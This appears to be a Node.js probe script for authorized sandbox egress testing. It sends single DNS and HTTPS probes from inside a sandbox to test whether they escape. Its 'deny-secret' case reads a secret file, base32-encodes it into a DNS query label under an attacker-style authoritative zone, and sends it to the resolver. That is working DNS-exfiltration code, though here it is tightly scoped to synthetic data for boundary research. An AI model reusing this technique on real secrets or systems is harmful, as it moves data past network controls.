import { randomBytes } from "node:crypto";
import dgram from "node:dgram";
import { constants as fsConstants } from "node:fs";
import { open, readFile } from "node:fs/promises";
import https from "node:https";
import { isIP } from "node:net";
import { resolve } from "node:path";
import { pathToFileURL } from "node:url";

export const TEST_ID = "SBX-001-DIRECT";
export const SCOPE_CONFIRMATION =
  "I_CONTROL_THE_SBX001_AUTHORITATIVE_DNS_AND_HTTPS_ENDPOINTS_AND_AUTHORIZE_BOUNDED_TESTING";
export const SECRET_FILE_PATH = "/tmp/sbx-001/operator-secret";
export const SECRET_BYTES = 16;

const RUN_ID = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/u;
const NONCE = /^[a-f0-9]{32}$/u;
const DNS_NAME = /^(?=.{1,253}$)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)*[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/u;
const BASE32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

function record(value, field) {
  if (value === null || typeof value !== "object" || Array.isArray(value)) throw new Error(`${field} must be an object`);
  return value;
}

function exactKeys(value, expected, field) {
  const actual = Object.keys(value).sort();
  const wanted = [...expected].sort();
  if (actual.length !== wanted.length || actual.some((key, index) => key !== wanted[index])) {
    throw new Error(`${field} fields are not exact`);
  }
}

function integer(value, field, minimum, maximum) {
  if (!Number.isInteger(value) || value < minimum || value > maximum) throw new Error(`${field} is invalid`);
  return value;
}

function canonicalDnsName(value, field = "DNS name") {
  if (typeof value !== "string" || value !== value.toLowerCase() || value.endsWith(".") || !DNS_NAME.test(value)) {
    throw new Error(`${field} must be a canonical lowercase DNS name`);
  }
  return value;
}

export function base32Encode(value) {
  let accumulator = 0;
  let availableBits = 0;
  let output = "";
  for (const byte of value) {
    accumulator = (accumulator << 8) | byte;
    availableBits += 8;
    while (availableBits >= 5) {
      availableBits -= 5;
      output += BASE32[(accumulator >>> availableBits) & 31];
      accumulator &= (1 << availableBits) - 1;
    }
  }
  if (availableBits > 0) output += BASE32[(accumulator << (5 - availableBits)) & 31];
  return output;
}

export function publicQueryName(caseId, queryNonce, authoritativeZone) {
  if (!NONCE.test(queryNonce)) throw new Error("query nonce is invalid");
  const prefix = caseId === "allow-public" ? "a" : caseId === "deny-public" ? "d" : undefined;
  if (!prefix) throw new Error("public DNS case is invalid");
  return canonicalDnsName(`${prefix}${queryNonce}.${canonicalDnsName(authoritativeZone, "authoritative zone")}`);
}

export async function secretQueryName(secretFilePath, queryNonce, authoritativeZone) {
  if (secretFilePath !== SECRET_FILE_PATH) throw new Error("secret path is invalid");
  if (!NONCE.test(queryNonce)) throw new Error("query nonce is invalid");
  const zone = canonicalDnsName(authoritativeZone, "authoritative zone");
  const noFollow = fsConstants.O_NOFOLLOW ?? 0;
  const handle = await open(secretFilePath, fsConstants.O_RDONLY | noFollow);
  let secret;
  try {
    const metadata = await handle.stat();
    if (!metadata.isFile() || (metadata.mode & 0o777) !== 0o600 || metadata.size !== SECRET_BYTES) {
      throw new Error("synthetic operator secret must be one mode-0600 16-byte regular file");
    }
    secret = await handle.readFile();
    if (secret.length !== SECRET_BYTES) throw new Error("synthetic operator secret changed during read");
    const label = `s${base32Encode(secret).toLowerCase()}${queryNonce}`;
    if (label.length !== 59 || label.length > 63) throw new Error("secret was not encoded in one bounded DNS label");
    return {
      queryName: canonicalDnsName(`${label}.${zone}`),
      secretFileValidated: true,
      secretFileMode: metadata.mode & 0o777,
      secretBytes: secret.length,
      secretEncodedInOneLabel: true,
    };
  } finally {
    secret?.fill(0);
    await handle.close();
  }
}

export function parseResolverAddress(contents) {
  if (typeof contents !== "string" || contents.length > 16_384) throw new Error("resolv.conf contents are invalid");
  for (const rawLine of contents.split(/\r?\n/u)) {
    const line = rawLine.replace(/#.*$/u, "").trim();
    const match = /^nameserver\s+(\S+)$/u.exec(line);
    if (match?.[1] && isIP(match[1]) !== 0) return match[1];
  }
  throw new Error("no IP nameserver exists in resolv.conf");
}

export function buildDnsAQuery(queryName, transactionId) {
  const name = canonicalDnsName(queryName);
  integer(transactionId, "transactionId", 0, 65_535);
  const encoded = [];
  for (const label of name.split(".")) {
    const bytes = Buffer.from(label, "ascii");
    encoded.push(Buffer.from([bytes.length]), bytes);
  }
  const header = Buffer.alloc(12);
  header.writeUInt16BE(transactionId, 0);
  header.writeUInt16BE(0x0100, 2);
  header.writeUInt16BE(1, 4);
  const tail = Buffer.from([0, 0, 1, 0, 1]);
  const packet = Buffer.concat([header, ...encoded, tail]);
  if (packet.length > 512) throw new Error("DNS packet exceeded its fixed bound");
  return packet;
}

export async function sendDnsOnce({ resolverAddress, queryName, timeoutMs, socketFactory = dgram.createSocket }) {
  const family = isIP(resolverAddress);
  if (family === 0) throw new Error("resolverAddress must be an IP address");
  integer(timeoutMs, "timeoutMs", 500, 5_000);
  const transactionId = randomBytes(2).readUInt16BE(0);
  const packet = buildDnsAQuery(queryName, transactionId);
  const socket = socketFactory(family === 6 ? "udp6" : "udp4");
  let timer;
  try {
    return await new Promise((resolvePromise) => {
      let finished = false;
      let datagramAcceptedByKernel = false;
      const finish = (result) => {
        if (finished) return;
        finished = true;
        if (timer) clearTimeout(timer);
        socket.close();
        resolvePromise({
          queryAttempts: 1,
          retryCount: 0,
          resolverFamily: family,
          resolverPort: 53,
          ...result,
        });
      };
      socket.once("error", (error) => finish({
        sendInvoked: true,
        datagramAcceptedByKernel,
        responseReceived: false,
        timedOut: false,
        errorCode: typeof error?.code === "string" ? error.code.slice(0, 64) : "UDP_ERROR",
      }));
      socket.once("message", (message) => {
        datagramAcceptedByKernel = true;
        const responseId = message.length >= 2 ? message.readUInt16BE(0) : -1;
        const flags = message.length >= 4 ? message.readUInt16BE(2) : 0;
        finish({
          sendInvoked: true,
          datagramAcceptedByKernel: true,
          responseReceived: true,
          timedOut: false,
          transactionIdMatched: responseId === transactionId,
          responseCode: flags & 0x000f,
        });
      });
      timer = setTimeout(() => finish({
        sendInvoked: true,
        datagramAcceptedByKernel,
        responseReceived: false,
        timedOut: true,
      }), timeoutMs);
      socket.send(packet, 53, resolverAddress, (error) => {
        if (error) finish({
          sendInvoked: true,
          datagramAcceptedByKernel: false,
          responseReceived: false,
          timedOut: false,
          errorCode: typeof error?.code === "string" ? error.code.slice(0, 64) : "UDP_SEND_ERROR",
        });
        else datagramAcceptedByKernel = true;
      });
    });
  } finally {
    packet.fill(0);
  }
}

function safeErrorCode(error, timedOut) {
  if (timedOut) return "ETIMEDOUT";
  const code = typeof error?.code === "string" ? error.code : undefined;
  if (code && /^[A-Z][A-Z0-9_]{0,63}$/u.test(code)) return code;
  return error instanceof Error && /^[A-Za-z][A-Za-z0-9]{0,63}$/u.test(error.name) ? error.name : "Error";
}

export async function runHttpsOnce({ endpointOrigin, timeoutMs }) {
  const origin = new URL(endpointOrigin);
  if (origin.protocol !== "https:" || endpointOrigin !== origin.origin || origin.port || origin.username ||
    origin.password || origin.pathname !== "/" || origin.search || origin.hash) {
    throw new Error("HTTPS control must be one exact HTTPS origin");
  }
  integer(timeoutMs, "timeoutMs", 1_000, 5_000);
  const startedAt = Date.now();
  return await new Promise((resolvePromise) => {
    let settled = false;
    let timedOut = false;
    const finish = (result) => {
      if (settled) return;
      settled = true;
      resolvePromise({ ...result, durationMs: Date.now() - startedAt });
    };
    const request = https.request({
      protocol: "https:",
      hostname: origin.hostname,
      port: 443,
      path: "/healthz",
      method: "GET",
      agent: false,
      timeout: timeoutMs,
      headers: {
        accept: "application/json",
        connection: "close",
        "user-agent": "vercel-sandbox-boundary-research/SBX-001",
      },
    }, (response) => {
      const statusCode = response.statusCode;
      response.destroy();
      finish({
        receivedResponse: true,
        ...(Number.isInteger(statusCode) ? { statusCode } : {}),
        timedOut: false,
      });
    });
    request.once("timeout", () => {
      timedOut = true;
      request.destroy(Object.assign(new Error("request timed out"), { code: "ETIMEDOUT" }));
    });
    request.once("error", (error) => finish({
      receivedResponse: false,
      timedOut,
      errorCode: safeErrorCode(error, timedOut),
    }));
    request.end();
  });
}

export function parseConfiguration(encoded) {
  if (typeof encoded !== "string" || encoded.length === 0 || encoded.length > 16_384) {
    throw new Error("configuration must be one bounded base64url argument");
  }
  let parsed;
  try {
    parsed = JSON.parse(Buffer.from(encoded, "base64url").toString("utf8"));
  } catch {
    throw new Error("configuration is not valid base64url JSON");
  }
  const config = record(parsed, "configuration");
  if (config.scopeConfirmation !== SCOPE_CONFIRMATION || config.testId !== TEST_ID ||
    typeof config.runId !== "string" || !RUN_ID.test(config.runId)) {
    throw new Error("configuration identity or scope is invalid");
  }
  integer(config.timeoutMs, "timeoutMs", config.mode === "dns" ? 500 : 1_000, 5_000);
  if (config.mode === "dns") {
    const allowed = new Set([
      "authoritativeZone", "caseId", "mode", "queryNonce", "runId", "scopeConfirmation", "secretFilePath", "testId", "timeoutMs",
    ]);
    if (Object.keys(config).some((key) => !allowed.has(key))) throw new Error("DNS configuration fields are not exact");
    canonicalDnsName(config.authoritativeZone, "authoritativeZone");
    if (typeof config.queryNonce !== "string" || !NONCE.test(config.queryNonce) ||
      !["allow-public", "deny-public", "deny-secret"].includes(config.caseId)) {
      throw new Error("DNS case or nonce is invalid");
    }
    if (config.caseId === "deny-secret") {
      if (config.secretFilePath !== SECRET_FILE_PATH) throw new Error("secret case requires the fixed secret path");
    } else if (config.secretFilePath !== undefined) {
      throw new Error("public DNS case must not receive a secret path");
    }
    return config;
  }
  if (config.mode === "https") {
    exactKeys(config, ["caseId", "endpointOrigin", "mode", "runId", "scopeConfirmation", "testId", "timeoutMs"], "HTTPS configuration");
    if (config.caseId !== "allow-https" && config.caseId !== "deny-https") throw new Error("HTTPS case is invalid");
    const endpoint = new URL(config.endpointOrigin);
    if (endpoint.protocol !== "https:" || config.endpointOrigin !== endpoint.origin || endpoint.port ||
      endpoint.username || endpoint.password) throw new Error("HTTPS endpoint origin is invalid");
    return config;
  }
  throw new Error("probe mode is invalid");
}

async function main() {
  let config;
  try {
    config = parseConfiguration(process.argv[2]);
    if (config.mode === "https") {
      const result = await runHttpsOnce(config);
      process.stdout.write(`${JSON.stringify({
        schemaVersion: 1,
        ok: true,
        mode: "https",
        runId: config.runId,
        testId: TEST_ID,
        guestNodeVersion: process.version,
        caseId: config.caseId,
        origin: config.endpointOrigin,
        path: "/healthz",
        connectionAttempts: 1,
        retryCount: 0,
        responseBodiesRetained: false,
        ...result,
      })}\n`);
      return;
    }
    const query = config.caseId === "deny-secret"
      ? await secretQueryName(config.secretFilePath, config.queryNonce, config.authoritativeZone)
      : {
          queryName: publicQueryName(config.caseId, config.queryNonce, config.authoritativeZone),
          secretFileValidated: false,
          secretEncodedInOneLabel: false,
        };
    const resolverAddress = parseResolverAddress(await readFile("/etc/resolv.conf", "utf8"));
    const result = await sendDnsOnce({ resolverAddress, queryName: query.queryName, timeoutMs: config.timeoutMs });
    process.stdout.write(`${JSON.stringify({
      schemaVersion: 1,
      ok: true,
      mode: "dns",
      runId: config.runId,
      testId: TEST_ID,
      guestNodeVersion: process.version,
      caseId: config.caseId,
      queryType: "A",
      ...result,
      secretFileValidated: query.secretFileValidated,
      ...(query.secretFileMode !== undefined ? { secretFileMode: query.secretFileMode } : {}),
      ...(query.secretBytes !== undefined ? { secretBytes: query.secretBytes } : {}),
      secretEncodedInOneLabel: query.secretEncodedInOneLabel,
      rawQueryNameRetained: false,
      rawSecretRetained: false,
      rawSecretDigestRetained: false,
    })}\n`);
  } catch (error) {
    process.stdout.write(`${JSON.stringify({
      schemaVersion: 1,
      ok: false,
      phase: config ? "execution" : "configuration",
      errorCode: error instanceof Error ? error.name.slice(0, 64) : "Error",
      rawQueryNameRetained: false,
      rawSecretRetained: false,
      rawSecretDigestRetained: false,
    })}\n`);
    process.exitCode = 1;
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(resolve(process.argv[1])).href) {
  await main();
}
